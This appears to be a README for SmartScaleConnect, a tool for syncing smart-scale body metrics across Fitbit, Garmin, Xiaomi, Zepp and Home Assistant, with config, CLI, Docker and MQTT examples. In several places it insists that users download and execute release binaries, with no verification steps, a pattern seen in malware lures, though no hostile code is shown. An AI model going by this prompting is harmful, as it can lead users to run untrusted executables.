[![Releases](https://img.shields.io/github/v/release/DJDuckOfficial/SmartScaleConnect?label=Releases&color=2ea44f)](https://github.com/DJDuckOfficial/SmartScaleConnect/releases)

# SmartScaleConnect — Sync Smart Scale Data Across Ecosystems ⚖️🔁

Sync weight and body metrics across Fitbit, Garmin, Xiaomi (Mi Fit), Zepp, and Home Assistant. This app pulls measurements from one ecosystem and pushes them to others. Use it to keep devices and services aligned without manual exports.

![Smart scale image](https://images.unsplash.com/photo-1514995669114-5d9f4ef1e9a6?ixlib=rb-4.0.3&auto=format&fit=crop&w=1500&q=80)

Topics: fitbit, garmin, garmin-connect, home-assistant, mi-fit, xiaomi, zepp

Badges
- Build: ![Build](https://img.shields.io/badge/build-passing-brightgreen)
- License: ![License](https://img.shields.io/badge/license-MIT-blue)
- Releases: [![Download Release](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/DJDuckOfficial/SmartScaleConnect/releases)

What SmartScaleConnect does
- Fetches weight, BMI, body fat, muscle mass, and other metrics from supported services.
- Maps metrics to target services using configurable rules.
- Writes data to target APIs or Home Assistant via API calls or MQTT.
- Runs as a scheduled job or as a long-running service with webhooks.

Key features
- Multi-platform sync: Fitbit, Garmin Connect, Mi Fit / Xiaomi, Zepp.
- Home Assistant integration through REST API or MQTT.
- Configurable mapping and transformation rules.
- Deduplication and rate-limit handling.
- Local cache and retry logic for unreliable APIs.
- CLI and Docker support.

Quick links
- Releases (download and execute the release file): https://github.com/DJDuckOfficial/SmartScaleConnect/releases
  - The release bundle file needs to be downloaded and executed. Pick the platform-specific binary or installer from the Releases page and run it on your host.
- If the link does not work, check the Releases section on the repository page.

Table of contents
- Installation
- Configuration
- Usage
- Supported platforms
- Data mapping
- Home Assistant examples
- Deployment
- Troubleshooting
- Contributing
- License

Installation

1. Choose an installation method
   - Binary: Download the platform binary from Releases and execute it.
   - Docker: Use the official Docker image (recommended for containers).
   - Source: Build from source with Go or Python (depending on the chosen runtime).

2. Download and run the release file
   - Visit the Releases page: https://github.com/DJDuckOfficial/SmartScaleConnect/releases
   - Download the file that matches your OS and architecture (example: SmartScaleConnect-linux-amd64.tar.gz).
   - Extract and run the executable:
     - Linux/macOS:
       - tar -xzf SmartScaleConnect-<version>-linux-amd64.tar.gz
       - chmod +x smartscaleconnect
       - ./smartscaleconnect --config config.yaml
     - Windows:
       - Unpack the zip and run SmartScaleConnect.exe
   - The release file needs to be downloaded and executed on the host where you want the sync to run.

Docker (example)
- docker run -d \
  -v /path/to/config.yaml:/app/config.yaml:ro \
  -e TZ=UTC \
  --name smartscaleconnect \
  ghcr.io/djduckofficial/smartscaleconnect:latest

Configuration

Core config (YAML)
- Keep config.yaml in the same folder as the executable or mount it for Docker.

Example config.yaml
```yaml
log_level: info
poll_interval: 3600  # seconds

sources:
  - name: fitbit
    type: fitbit
    client_id: YOUR_CLIENT_ID
    client_secret: YOUR_CLIENT_SECRET
    refresh_token: YOUR_REFRESH_TOKEN

  - name: garmin
    type: garmin-connect
    username: your_garmin_username
    password: your_garmin_password

targets:
  - name: home_assistant
    type: home-assistant
    url: https://homeassistant.local:8123
    token: LONG_LIVED_ACCESS_TOKEN

mapping:
  weight:
    source: weight
    targets: [weight, body_mass]
    multiplier: 1.0
  body_fat:
    source: body_fat
    targets: [body_fat_percentage]
```

Auth flows
- Fitbit: OAuth2 with refresh tokens. Use the web flow to obtain tokens and place them in config.
- Garmin: Use basic auth or device login depending on their API.
- Xiaomi/Mi Fit and Zepp: Use account tokens or local bridge if available.

CLI

Common commands
- ./smartscaleconnect --config config.yaml --run-once
- ./smartscaleconnect --config config.yaml --daemon
- ./smartscaleconnect --help

Usage examples

Run a one-off sync
- ./smartscaleconnect --config config.yaml --run-once

Run as scheduled service (systemd example)
- Create /etc/systemd/system/smartscaleconnect.service
  - [Unit]
    Description=SmartScaleConnect Service
  - [Service]
    ExecStart=/usr/local/bin/smartscaleconnect --config /etc/smartscaleconnect/config.yaml
    Restart=on-failure
  - [Install]
    WantedBy=multi-user.target
- systemctl daemon-reload
- systemctl enable --now smartscaleconnect

Supported platforms

Primary integrations
- Fitbit (weight, body composition)
- Garmin Connect (weight, body mass)
- Mi Fit / Xiaomi (scale metrics)
- Zepp (Amazfit data bridge)
- Home Assistant (REST API, MQTT)
- Generic REST endpoints for custom services

Data model and mapping

Core metric set
- weight (kg)
- body_fat (percentage)
- bmi
- muscle_mass (kg)
- bone_mass (kg)
- visceral_fat_index

Mapping rules
- Define a source metric and list target metrics.
- Use multiplier to convert units (e.g., lbs to kg).
- Include transform functions for complex conversions (example: round to two decimals).

Deduplication
- The app stores a short hash of recent measurements.
- It ignores duplicates based on timestamp and value threshold.
- You can configure dedup interval in config.yaml.

Home Assistant integration

Push to Home Assistant via REST
- Use an access token and the REST API to create sensor entities.
- Example curl:
  - curl -X POST -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" \
    -d '{"state":"72.5","attributes":{"unit_of_measurement":"kg","friendly_name":"Scale Weight"}}' \
    https://homeassistant.local:8123/api/states/sensor.smartscale_weight

MQTT option
- smartscaleconnect can publish to an MQTT broker.
- Configure broker URL, topic prefix, and credentials in config.yaml.

Example Home Assistant sensor config (for local MQTT)
```yaml
sensor:
  - platform: mqtt
    name: "Smart Scale Weight"
    state_topic: "smartscale/weight"
    unit_of_measurement: "kg"
    value_template: "{{ value_json.weight }}"
```

Deployment patterns

Edge device
- Run on a Raspberry Pi or NUC near your network.
- Schedule with cron or run as systemd service.

Cloud
- Run in a small VPS or container host.
- Keep secrets in environment variables or a secrets store.

Security

Auth storage
- Store client secrets in a config file with restricted permissions.
- Prefer long-lived tokens for Home Assistant.

Network
- Use TLS for remote services.
- Avoid exposing admin endpoints to the public internet.

Scaling and rate limiting
- The app batches calls where possible.
- It respects provider rate limits and retries with backoff.

Troubleshooting

Common issues and fixes
- No data from source
  - Check API tokens and refresh tokens.
  - Verify system time on the host.
- Writes fail to target
  - Check target API token.
  - Inspect rate-limit headers returned by the API.
- Duplicate entries
  - Adjust deduplication window in config.

Logs
- Logs go to stdout by default.
- Set log level in config.yaml to debug for more detail.

FAQ

Q: Which metrics sync both ways?
A: The app treats each sync as uni-directional per rule. You can create sync rules for both directions but manage deduplication to avoid loops.

Q: Can I filter which devices sync?
A: Yes. Use device_id or source name filters in mapping rules.

Q: Can I run multiple instances?
A: Yes. Use different config files and avoid overlapping schedules to prevent race conditions.

Contributing

How to contribute
- Fork the repo.
- Create a feature branch named feat/<short-description>.
- Run tests: make test
- Open a pull request with a clear description and changelog entry.

Development notes
- The code uses modular adapters per provider (fitbit, garmin, mi-fit, zepp).
- Adding a provider requires implementing the adapter interface and tests.

Testing
- Unit tests for mapping logic.
- Integration tests use recorded API responses.
- Use the test runner: make test

Release process
- Tag a release, increment semantic version, update changelog.
- Upload platform binaries to the Releases page.
- End users must download and execute the release file from Releases.

Releases and downloads
- Grab platform-specific bundles at: https://github.com/DJDuckOfficial/SmartScaleConnect/releases
  - Download the package for your OS and run the included executable or installer.
- If that link does not work, check the Releases section on the main repo page.

License

MIT License — see LICENSE file.

Contact and links
- Repository: https://github.com/DJDuckOfficial/SmartScaleConnect
- Releases: https://github.com/DJDuckOfficial/SmartScaleConnect/releases

Graphical assets and resources
- Scale photo: Unsplash (public image)
- Provider logos: Use official branding per provider guidelines

Security disclosures
- Report security issues via the repository's issue tracker labeled "security".

Acknowledgments
- Inspired by community tools that bridge health ecosystems and local automation platforms.
- Test data provided by community contributors and anonymized test accounts.